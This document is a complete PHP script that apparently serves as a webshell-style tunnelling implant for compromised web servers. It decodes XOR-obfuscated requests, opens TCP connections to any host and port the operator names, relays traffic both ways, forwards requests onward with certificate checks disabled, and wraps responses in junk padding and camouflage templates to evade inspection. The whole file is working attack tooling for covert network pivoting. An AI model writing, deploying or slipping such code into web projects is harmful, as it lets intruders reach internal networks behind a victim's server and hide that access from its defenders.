<?php
error_reporting(E_ERROR | E_PARSE);
ini_set('display_errors', 0);
ini_set('display_startup_errors', 0);
ini_set("allow_url_fopen", true);
ini_set("allow_url_include", true);
@ini_set('always_populate_raw_post_data', -1);
ini_set('max_execution_time', 0);

// Session configuration
ini_set('session.use_only_cookies', false);
ini_set('session.use_cookies', false);
ini_set('session.use_trans_sid', false);
ini_set('session.cache_limiter', null);
$SAVED_PHPSESSID = '';
if (array_key_exists('PHPSESSID', $_COOKIE)) {
    session_id($_COOKIE['PHPSESSID']);
    $SAVED_PHPSESSID = $_COOKIE['PHPSESSID'];
} else {
    session_start();
    $SAVED_PHPSESSID = session_id();
    setcookie('PHPSESSID', $SAVED_PHPSESSID);
    session_write_close();
}

// Disable output buffering
@ini_set('zlib.output_compression', 0);
ob_implicit_flush(true);
while (ob_get_level()) {
    ob_end_clean();
}

define('BUF_SIZE', 1024 * 16);
define('MAX_READ_SIZE', 512 * 1024);

// ============================================================================
// Base64 URL-safe encoding/decoding
// ============================================================================

function base64UrlEncode($data) {
    $encoded = base64_encode($data);
    $encoded = strtr($encoded, '+/', '-_');
    $encoded = rtrim($encoded, '=');
    return $encoded;
}

function base64UrlDecode($data) {
    $data = strtr($data, '-_', '+/');
    $padding = strlen($data) % 4;
    if ($padding) {
        $data .= str_repeat('=', 4 - $padding);
    }
    return base64_decode($data);
}

// ============================================================================
// Protocol marshal/unmarshal
// ============================================================================

function marshalBase64($m) {
    $junkSize = mt_rand(0, 32);
    if ($junkSize > 0) {
        if (function_exists('openssl_random_pseudo_bytes')) {
            $m['_'] = openssl_random_pseudo_bytes($junkSize);
        } else {
            $junkChars = array();
            for ($i = 0; $i < $junkSize; $i++) {
                $junkChars[] = chr(mt_rand(0, 255));
            }
            $m['_'] = implode('', $junkChars);
        }
    }

    $bufParts = array();
    foreach ($m as $key => $value) {
        $bufParts[] = chr(strlen($key)) . $key . pack('N', strlen($value)) . $value;
    }
    $buf = implode('', $bufParts);

    $xorKey = array(mt_rand(1, 255), mt_rand(1, 255));
    $bufLen = strlen($buf);
    $dataChars = array();
    for ($i = 0; $i < $bufLen; $i++) {
        $dataChars[] = chr(ord($buf[$i]) ^ $xorKey[$i % 2]);
    }
    $data = base64UrlEncode(implode('', $dataChars));

    $header = pack('C2N', $xorKey[0], $xorKey[1], strlen($data));
    $headerBytes = unpack('C*', $header);
    $headerBytes[3] = $headerBytes[3] ^ $xorKey[2 % 2];
    $headerBytes[4] = $headerBytes[4] ^ $xorKey[3 % 2];
    $headerBytes[5] = $headerBytes[5] ^ $xorKey[4 % 2];
    $headerBytes[6] = $headerBytes[6] ^ $xorKey[5 % 2];
    $header = pack('C*', $headerBytes[1], $headerBytes[2], $headerBytes[3], $headerBytes[4], $headerBytes[5], $headerBytes[6]);
    $header = base64UrlEncode($header);

    return $header . $data;
}

function unmarshalBase64($input) {
    $m = array();

    $header = fread($input, 8);
    if (strlen($header) !== 8) {
        return $m;
    }

    $header = base64UrlDecode($header);
    if (!$header || strlen($header) < 6) {
        return $m;
    }

    $headerBytes = unpack('C*', $header);
    $xorKey = array($headerBytes[1], $headerBytes[2]);

    for ($i = 3; $i <= 6; $i++) {
        $headerBytes[$i] = $headerBytes[$i] ^ $xorKey[($i - 1) % 2];
    }
    $length = ($headerBytes[3] << 24) | ($headerBytes[4] << 16) | ($headerBytes[5] << 8) | $headerBytes[6];

    if ($length > 32 * 1024 * 1024) {
        throw new Exception('invalid length');
    }

    $data = stream_get_contents($input, $length);
    if (strlen($data) !== $length) {
        throw new Exception('invalid data length');
    }

    $data = base64UrlDecode($data);
    if (!$data) {
        return $m;
    }

    $dataLen = strlen($data);
    $decryptedChars = array();
    for ($i = 0; $i < $dataLen; $i++) {
        $decryptedChars[] = chr(ord($data[$i]) ^ $xorKey[$i % 2]);
    }
    $decrypted = implode('', $decryptedChars);

    $i = 0;
    $len = strlen($decrypted);
    while ($i < $len) {
        if ($i + 1 > $len) break;
        $kLen = ord($decrypted[$i]);
        $i++;

        if ($i + $kLen > $len) break;
        $key = substr($decrypted, $i, $kLen);
        $i += $kLen;

        if ($i + 4 > $len) break;
        $vLenBytes = unpack('N', substr($decrypted, $i, 4));
        $vLen = $vLenBytes[1];
        $i += 4;

        if ($vLen < 0 || $i + $vLen > $len) break;
        $value = substr($decrypted, $i, $vLen);
        $i += $vLen;

        $m[$key] = $value;
    }

    return $m;
}

// ============================================================================
// Helper functions
// ============================================================================

function randomString($length) {
    $characters = 'abcdefghijklmnopqrstuvwxyz0123456789';
    $charactersLength = strlen($characters);
    $resultChars = array();
    for ($i = 0; $i < $length; $i++) {
        $resultChars[] = $characters[mt_rand(0, $charactersLength - 1)];
    }
    return implode('', $resultChars);
}

function createStreamContext() {
    $opts = array(
        'socket' => array(
            'tcp_nodelay' => true,
            'so_rcvbuf' => 128 * 1024,
            'so_sndbuf' => 128 * 1024,
        ),
    );
    return stream_context_create($opts);
}

function ensureSocketOptions($socket) {
    if (!is_resource($socket) && !is_object($socket)) {
        return false;
    }

    @stream_set_blocking($socket, false);
    @stream_set_timeout($socket, 0, 0);

    return true;
}

function newData($tunId, $data) {
    return array(
        'ac' => chr(0x01),
        'dt' => $data,
        'id' => $tunId
    );
}

function newDel($tunId) {
    return array(
        'ac' => chr(0x02),
        'id' => $tunId
    );
}

function newStatus($tunId, $status) {
    return array(
        'ac' => chr(0x03),
        's' => chr($status),
        'id' => $tunId
    );
}

function newHeartbeat($tunId) {
    return array(
        'ac' => chr(0x10),
        'id' => $tunId
    );
}

function newDirtyChunk($size) {
    $m = array('ac' => chr(0x11));
    if ($size > 0) {
        if (function_exists('openssl_random_pseudo_bytes')) {
            $m['d'] = openssl_random_pseudo_bytes($size);
        } else {
            $dataChars = array();
            for ($i = 0; $i < $size; $i++) {
                $dataChars[] = chr(mt_rand(0, 255));
            }
            $m['d'] = implode('', $dataChars);
        }
    }
    return $m;
}

function writeAndFlush($data, $dirtySize = 0) {
    if (!$data || strlen($data) === 0) {
        return;
    }
    echo $data;
    if ($dirtySize > 0) {
        echo marshalBase64(newDirtyChunk($dirtySize));
    }
    flush();
    if (function_exists('ob_flush')) {
        @ob_flush();
    }
}

function getKey($key) {
    @session_start();
    $value = isset($_SESSION[$key]) ? $_SESSION[$key] : null;
    session_write_close();
    return $value;
}

function putKey($key, $value) {
    @session_start();
    $_SESSION[$key] = $value;
    session_write_close();
}

function removeKey($key) {
    @session_start();
    if (isset($_SESSION[$key])) {
        unset($_SESSION[$key]);
    }
    session_write_close();
}

function processTemplateStart($sid) {
    $tplParts = getKey($sid);
    if ($tplParts === null || !is_array($tplParts) || count($tplParts) !== 3) {
        return '';
    }
    header('Content-Type: ' . $tplParts[0]);
    return $tplParts[1];
}

function processTemplateEnd($sid) {
    $tplParts = getKey($sid);
    if ($tplParts === null || !is_array($tplParts) || count($tplParts) !== 3) {
        return '';
    }
    return $tplParts[2];
}

function getDirtySize($sid) {
    $size = getKey($sid . '_jk');
    return ($size !== null) ? intval($size) : 0;
}


function processRedirect($dataMap, $bodyPrefix, $bodyContent) {
    global $SAVED_PHPSESSID;

    if (!isset($dataMap['r']) || empty($dataMap['r'])) {
        return false;
    }

    if (!function_exists('curl_init')) {
        return false;
    }

    $redirectUrl = $dataMap['r'];

    unset($dataMap['r']);

    $ch = null;
    try {
        $newBody = $bodyPrefix . marshalBase64($dataMap) . $bodyContent;

        $ch = curl_init($redirectUrl);
        if (!$ch) {
            return false;
        }

        $requestMethod = isset($_SERVER['REQUEST_METHOD']) ? $_SERVER['REQUEST_METHOD'] : 'POST';
        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, $requestMethod);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $newBody);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, false);
        curl_setopt($ch, CURLOPT_HEADER, false);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
        curl_setopt($ch, CURLOPT_ENCODING, '');

        $excludedHeaders = array('HOST', 'CONTENT-LENGTH', 'CONTENT-TYPE', 'TRANSFER-ENCODING');
        $headers = array();
        $hasCookie = false;
        $cookieValue = '';
        foreach ($_SERVER as $key => $value) {
            if (strpos($key, 'HTTP_') === 0) {
                $header = str_replace('_', '-', substr($key, 5));
                $headerUpper = strtoupper($header);
                if (!in_array($headerUpper, $excludedHeaders)) {
                    if ($headerUpper === 'COOKIE') {
                        $hasCookie = true;
                        $cookieValue = $value;
                    }
                    $headers[] = $header . ': ' . $value;
                }
            }
        }

        if ($SAVED_PHPSESSID) {
            if (!$hasCookie) {
                $headers[] = 'Cookie: PHPSESSID=' . $SAVED_PHPSESSID;
            } else if (strpos($cookieValue, 'PHPSESSID') === false) {
                $headers = array_filter($headers, function($h) {
                    return stripos($h, 'Cookie:') !== 0;
                });
                $headers = array_values($headers);
                $headers[] = 'Cookie: PHPSESSID=' . $SAVED_PHPSESSID . '; ' . $cookieValue;
            }
        }

        if (isset($_SERVER['CONTENT_TYPE'])) {
            $headers[] = 'Content-Type: ' . $_SERVER['CONTENT_TYPE'];
        }
        $headers[] = 'Content-Length: ' . strlen($newBody);
        $headers[] = 'Connection: close';

        $urlParts = parse_url($redirectUrl);
        if (isset($urlParts['host'])) {
            $headers[] = 'Host: ' . $urlParts['host'];
        }
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

        $bytesWritten = 0;
        curl_setopt($ch, CURLOPT_WRITEFUNCTION, function($curl, $data) use (&$bytesWritten) {
            $len = strlen($data);
            $bytesWritten += $len;
            echo $data;
            flush();
            if (function_exists('ob_flush')) {
                @ob_flush();
            }
            return $len;
        });

        $result = curl_exec($ch);

        curl_close($ch);

        return $result !== false;

    } catch (Exception $e) {
        if ($ch) {
            curl_close($ch);
        }
        return false;
    }
}

// ============================================================================
// Mode: Handshake (0x00)
// ============================================================================

function processHandshake($dataMap, $tunId) {
    if (isset($dataMap['r']) && !empty($dataMap['r'])) {
        processRedirect($dataMap, '', '');
        return;
    }

    $sid = randomString(16);

    $tplData = isset($dataMap['tpl']) ? $dataMap['tpl'] : '';
    $contentTypeData = isset($dataMap['ct']) ? $dataMap['ct'] : '';

    if ($tplData && $contentTypeData) {
        $parts = explode('#data#', $tplData, 2);
        if (count($parts) === 2) {
            putKey($sid, array($contentTypeData, $parts[0], $parts[1]));
        } else {
            putKey($sid, array());
        }
    } else {
        putKey($sid, array());
    }

    $dirtySizeData = isset($dataMap['jk']) ? $dataMap['jk'] : '';
    if ($dirtySizeData) {
        $dirtySize = intval($dirtySizeData);
        if ($dirtySize < 0) {
            $dirtySize = 0;
        }
        putKey($sid . '_jk', $dirtySize);
    }

    $isAutoData = isset($dataMap['a']) ? $dataMap['a'] : '';
    $isAuto = $isAutoData && strlen($isAutoData) > 0 && ord($isAutoData[0]) === 0x01;

    $dtData = isset($dataMap['dt']) ? $dataMap['dt'] : '';

    if ($isAuto) {
        header('X-Accel-Buffering: no');

        writeAndFlush(processTemplateStart($sid), 0);
        writeAndFlush(marshalBase64(newData($tunId, $dtData)), 0);

        sleep(2);

        writeAndFlush(marshalBase64(newData($tunId, $sid)), 0);
        writeAndFlush(processTemplateEnd($sid), 0);
    } else {
        $response = processTemplateStart($sid);
        $response .= marshalBase64(newData($tunId, $dtData));
        $response .= marshalBase64(newData($tunId, $sid));
        $response .= processTemplateEnd($sid);

        header('Content-Length: ' . strlen($response));
        writeAndFlush($response, 0);
    }
}

// ============================================================================
// Mode: Half (0x02)
// ============================================================================

function processHalfStream($dataMap, $tunId, $sid) {
    $dirtySize = getDirtySize($sid);
    $action = isset($dataMap['ac']) ? ord($dataMap['ac'][0]) : -1;

    try {
        switch ($action) {
            case 0x00: // CREATE
                performHalfCreate($dataMap, $tunId, $dirtySize);
                break;

            case 0x01: // WRITE
                performWrite($dataMap, $tunId);
                break;

            case 0x02: // DELETE
                performDelete($tunId);
                break;

            case 0x10: // HEARTBEAT
                writeAndFlush(marshalBase64(newHeartbeat($tunId)), $dirtySize);
                break;
        }
    } catch (Exception $e) {
        performDelete($tunId);
        writeAndFlush(marshalBase64(newDel($tunId)), $dirtySize);
    }
}

function performHalfCreate($dataMap, $tunId, $dirtySize) {
    $host = isset($dataMap['h']) ? $dataMap['h'] : '';
    $portStr = isset($dataMap['p']) ? $dataMap['p'] : '0';
    $port = intval($portStr);

    if ($port === 0) {
        $port = isset($_SERVER['SERVER_PORT']) ? intval($_SERVER['SERVER_PORT']) : 80;
    }

    $context = createStreamContext();
    $socket = @stream_socket_client(
        "tcp://{$host}:{$port}",
        $errno,
        $errstr,
        5,
        STREAM_CLIENT_CONNECT,
        $context
    );

    if (!$socket) {
        writeAndFlush(marshalBase64(newStatus($tunId, 0x01)), $dirtySize);
        return;
    }

    ensureSocketOptions($socket);

    putKey($tunId . '_ok', true);
    putKey($tunId . '_write_buf', '');

    writeAndFlush(marshalBase64(newStatus($tunId, 0x00)), $dirtySize);

    $lastActivityTime = time();
    $loopCount = 0;
    $consecutiveEmptyReads = 0;

    while (true) {
        $loopCount++;

        $okStatus = getKey($tunId . '_ok');
        if ($okStatus === false || $okStatus === null) {
            break;
        }

        if (connection_aborted()) {
            break;
        }

        $read = array($socket);
        $write = null;
        $except = array($socket);
        $result = @stream_select($read, $write, $except, 0, 100000);

        if ($result === false) {
            break;
        }

        if (!empty($except)) {
            break;
        }

        if ($result > 0 && in_array($socket, $read)) {
            $data = @fread($socket, BUF_SIZE);
            $eofStatus = feof($socket);

            if ($data === false || $eofStatus) {
                break;
            }
            if (strlen($data) > 0) {
                writeAndFlush(marshalBase64(newData($tunId, $data)), $dirtySize);
                $lastActivityTime = time();
                $consecutiveEmptyReads = 0;
            } else {
                $consecutiveEmptyReads++;
                if ($consecutiveEmptyReads > 100) {
                    break;
                }
            }
        }

        $writeBuf = getKey($tunId . '_write_buf');
        if ($writeBuf && strlen($writeBuf) > 0) {
            $expectedLen = strlen($writeBuf);
            putKey($tunId . '_write_buf', '');
            $written = @fwrite($socket, $writeBuf);

            if ($written === false) {
                break;
            }
            if ($written < $expectedLen) {
                $unwritten = substr($writeBuf, $written);
                $existingBuf = getKey($tunId . '_write_buf');
                putKey($tunId . '_write_buf', $unwritten . $existingBuf);
            }
            $lastActivityTime = time();
        }

        $currentTime = time();
        if ($currentTime - $lastActivityTime > 60) {
            break;
        }

        if ($loopCount % 50 === 0 && $currentTime - $lastActivityTime > 5) {
            writeAndFlush(marshalBase64(newHeartbeat($tunId)), $dirtySize);
        }
    }
    @fclose($socket);
    removeKey($tunId . '_ok');
    removeKey($tunId . '_write_buf');
    writeAndFlush(marshalBase64(newDel($tunId)), $dirtySize);
}

// ============================================================================
// Mode: Classic (0x03)
// ============================================================================

function processClassic($dataMap, $tunId, $respBodyStream, &$needWorker, &$workerSocket, &$workerTunId) {
    $sendClose = true;

    try {
        $action = isset($dataMap['ac']) ? ord($dataMap['ac'][0]) : -1;

        switch ($action) {
            case 0x00: // CREATE
                $result = performClassicCreate($dataMap, $tunId);
                fwrite($respBodyStream, $result['data']);
                if ($result['socket']) {
                    $needWorker = true;
                    $workerSocket = $result['socket'];
                    $workerTunId = $tunId;
                }
                break;

            case 0x01: // WRITE + READ
                performWrite($dataMap, $tunId);
                $readData = performRead($tunId);
                fwrite($respBodyStream, $readData);
                break;

            case 0x02: // DELETE
                $sendClose = false;
                performDelete($tunId);
                break;
        }
    } catch (Exception $e) {
        performDelete($tunId);
        if ($sendClose) {
            fwrite($respBodyStream, marshalBase64(newDel($tunId)));
        }
    }
}

function performClassicCreate($dataMap, $tunId) {
    $host = isset($dataMap['h']) ? $dataMap['h'] : '';
    $portStr = isset($dataMap['p']) ? $dataMap['p'] : '0';
    $port = intval($portStr);

    if ($port === 0) {
        $port = isset($_SERVER['SERVER_PORT']) ? intval($_SERVER['SERVER_PORT']) : 80;
    }

    $context = createStreamContext();
    $socket = @stream_socket_client(
        "tcp://{$host}:{$port}",
        $errno,
        $errstr,
        3,
        STREAM_CLIENT_CONNECT,
        $context
    );

    if (!$socket) {
        return array(
            'data' => marshalBase64(newStatus($tunId, 0x01)),
            'socket' => null
        );
    }

    ensureSocketOptions($socket);

    putKey($tunId . '_ok', true);
    putKey($tunId . '_read_buf', '');
    putKey($tunId . '_write_buf', '');

    return array(
        'data' => marshalBase64(newStatus($tunId, 0x00)),
        'socket' => $socket
    );
}

function classicBackgroundWorker($socket, $tunId) {
    @ignore_user_abort(true);
    @set_time_limit(0);

    $lastActivityTime = time();
    $loopCount = 0;
    $consecutiveEmptyReads = 0;

    while (true) {
        $loopCount++;

        $okStatus = getKey($tunId . '_ok');
        if ($okStatus === false || $okStatus === null) {
            break;
        }

        $read = array($socket);
        $write = null;
        $except = array($socket);
        $result = @stream_select($read, $write, $except, 0, 100000);

        if ($result === false) {
            break;
        }

        if (!empty($except)) {
            break;
        }

        if ($result > 0 && in_array($socket, $read)) {
            $data = @fread($socket, BUF_SIZE);
            $eofStatus = feof($socket);

            if ($data === false || $eofStatus) {
                break;
            }
            if (strlen($data) > 0) {
                $key = $tunId . '_read_buf';
                $existingBuf = getKey($key);
                if ($existingBuf === null) {
                    $existingBuf = '';
                }
                putKey($key, $existingBuf . $data);

                $lastActivityTime = time();
                $consecutiveEmptyReads = 0;
            } else {
                $consecutiveEmptyReads++;
                if ($consecutiveEmptyReads > 100) {
                    break;
                }
            }
        }

        $writeBuf = getKey($tunId . '_write_buf');
        if ($writeBuf && strlen($writeBuf) > 0) {
            $expectedLen = strlen($writeBuf);
            putKey($tunId . '_write_buf', '');
            $written = @fwrite($socket, $writeBuf);

            if ($written === false) {
                break;
            }
            if ($written < $expectedLen) {
                $unwritten = substr($writeBuf, $written);
                $existingBuf = getKey($tunId . '_write_buf');
                putKey($tunId . '_write_buf', $unwritten . $existingBuf);
            }
            $lastActivityTime = time();
        }

        $currentTime = time();
        if ($currentTime - $lastActivityTime > 60) {
            break;
        }
    }
    @fclose($socket);
    removeKey($tunId . '_ok');
    removeKey($tunId . '_read_buf');
    removeKey($tunId . '_write_buf');
}

function performWrite($dataMap, $tunId) {
    $data = isset($dataMap['dt']) ? $dataMap['dt'] : '';

    if (strlen($data) === 0) {
        return;
    }

    // Append to write buffer using session
    $key = $tunId . '_write_buf';
    $existingBuf = getKey($key);
    if ($existingBuf === null) {
        $existingBuf = '';
    }
    putKey($key, $existingBuf . $data);
}

function performRead($tunId) {
    $key = $tunId . '_read_buf';
    $readBuf = getKey($key);

    if ($readBuf === null || $readBuf === '') {
        return '';
    }

    $dataToSend = '';

    if (strlen($readBuf) > MAX_READ_SIZE) {
        $dataToSend = substr($readBuf, 0, MAX_READ_SIZE);
        $remaining = substr($readBuf, MAX_READ_SIZE);
        putKey($key, $remaining);
    } else {
        $dataToSend = $readBuf;
        putKey($key, '');
    }

    $response = '';
    if (strlen($dataToSend) > 0) {
        $response .= marshalBase64(newData($tunId, $dataToSend));
    }

    return $response;
}

function performDelete($tunId) {
    putKey($tunId . '_ok', false);
    removeKey($tunId . '_read_buf');
    removeKey($tunId . '_write_buf');
}

// ============================================================================
// Main entry point
// ============================================================================

function process() {
    $requestBody = file_get_contents('php://input');
    if (!$requestBody) {
        return;
    }

    $bodyStream = fopen('php://memory', 'r+');
    fwrite($bodyStream, $requestBody);
    rewind($bodyStream);

    try {
        $dataMap = unmarshalBase64($bodyStream);

        if (empty($dataMap)) {
            return;
        }

        $mode = isset($dataMap['m']) ? $dataMap['m'] : '';
        $action = isset($dataMap['ac']) ? $dataMap['ac'] : '';
        $tunId = isset($dataMap['id']) ? $dataMap['id'] : '';
        $sidData = isset($dataMap['sid']) ? $dataMap['sid'] : '';

        if (!$action || strlen($action) !== 1 || !$tunId || !$mode || strlen($mode) !== 1) {
            return;
        }

        $sid = $sidData ? $sidData : '';
        $modeValue = ord($mode[0]);

        switch ($modeValue) {
            case 0x00:
                processHandshake($dataMap, $tunId);
                break;

            case 0x02:
                header('X-Accel-Buffering: no');

            case 0x03:
                $remainingBody = stream_get_contents($bodyStream);

                if (processRedirect($dataMap, '', $remainingBody)) {
                    break;
                }

                $sid = isset($dataMap['sid']) ? $dataMap['sid'] : '';
                if (!$sid) {
                    header('HTTP/1.1 403 Forbidden');
                    return;
                }

                $sessionData = getKey($sid);
                if ($sessionData === null) {
                    header('HTTP/1.1 403 Forbidden');
                    return;
                }

                $bodyStream2 = fopen('php://memory', 'r+');
                fwrite($bodyStream2, $remainingBody);
                rewind($bodyStream2);

                $dirtySize = getDirtySize($sid);

                if ($modeValue === 0x02) {
                    writeAndFlush(processTemplateStart($sid), $dirtySize);

                    do {
                        processHalfStream($dataMap, $tunId, $sid);
                        try {
                            $dataMap = unmarshalBase64($bodyStream2);
                            if (empty($dataMap)) {
                                break;
                            }
                            $tunId = isset($dataMap['id']) ? $dataMap['id'] : '';
                        } catch (Exception $e) {
                            break;
                        }
                    } while (true);

                    writeAndFlush(processTemplateEnd($sid), $dirtySize);
                } else {
                    $respBodyStream = fopen('php://memory', 'r+');
                    fwrite($respBodyStream, processTemplateStart($sid));

                    $needWorker = false;
                    $workerSocket = null;
                    $workerTunId = '';

                    do {
                        processClassic($dataMap, $tunId, $respBodyStream, $needWorker, $workerSocket, $workerTunId);
                        try {
                            $dataMap = unmarshalBase64($bodyStream2);
                            if (empty($dataMap)) {
                                break;
                            }
                            $tunId = isset($dataMap['id']) ? $dataMap['id'] : '';
                        } catch (Exception $e) {
                            break;
                        }
                    } while (true);

                    fwrite($respBodyStream, processTemplateEnd($sid));

                    rewind($respBodyStream);
                    $response = stream_get_contents($respBodyStream);
                    fclose($respBodyStream);

                    header('Content-Length: ' . strlen($response));
                    echo $response;
                    flush();
                    if (function_exists('ob_flush')) {
                        @ob_flush();
                    }

                    ignore_user_abort(true);
                    if ($needWorker && $workerSocket) {
                        if (function_exists('fastcgi_finish_request')) {
                            fastcgi_finish_request();
                        }
                        classicBackgroundWorker($workerSocket, $workerTunId);
                    }
                }

                fclose($bodyStream2);
                break;
        }

    } catch (Exception $e) {
    } finally {
        fclose($bodyStream);
    }
}

process();